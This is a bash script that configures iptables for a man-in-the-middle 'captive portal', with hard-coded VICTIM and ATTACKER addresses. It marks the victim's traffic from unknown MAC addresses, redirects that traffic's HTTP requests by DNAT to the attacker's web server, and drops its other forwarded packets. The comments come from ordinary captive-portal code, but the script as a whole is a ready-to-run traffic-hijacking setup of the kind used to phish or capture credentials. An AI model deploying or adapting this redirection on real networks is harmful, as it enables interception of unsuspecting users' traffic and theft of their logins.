#!/bin/bash
# Script to configure IPTables for MiTM Captive Portal

# Configurable variables
IPTABLES=/sbin/iptables
VICTIM=172.25.51.106
ATTACKER=172.25.100.20

# /usr/local/sbin/iptables
# Create internet chain and add allow rules
# This is used to authenticate users who have already signed up
$IPTABLES -A FORWARD -s $VICTIM -p udp -m udp --dport 53 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
$IPTABLES -A INPUT -p udp -m udp --sport 53 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
$IPTABLES -N internet -t nat
# First send all traffic via newly created internet chain
# At the prerouting NAT stage this will DNAT them to the local
# webserver for them to signup if they aren't authorized
# Packets for unauthorized users are marked for dropping later
$IPTABLES -t nat -A PREROUTING -j internet
###### INTERNET CHAIN ##########
# Allow authorized clients in, redirect all others to login webserver
# Add known users to the NAT table to stop their dest being rewritten
# Ignore MAC address with a * - these users are blocked
# This awk script goes through the /var/lib/users flat file line by line
#awk 'BEGIN { FS="t"; } { system("$IPTABLES -t nat -A internet -m mac --mac-source "$4" -j RETURN"); }' /var/lib/users
# MAC address not found. Mark the packet 99
$IPTABLES -t nat -A internet -j MARK --set-mark 99
# Redirects web requests from Unauthorized users to logon Web Page
$IPTABLES -t nat -A internet -m mark --mark 99 -p tcp --dport 80 -j DNAT --to-destination $ATTACKER
################################
# Now that we've got to the forward filter, drop all packets
# marked 99 - these are unknown users. We can't drop them earlier
# as there's no filter table
$IPTABLES -t filter -A FORWARD -m mark --mark 99 -j DROP

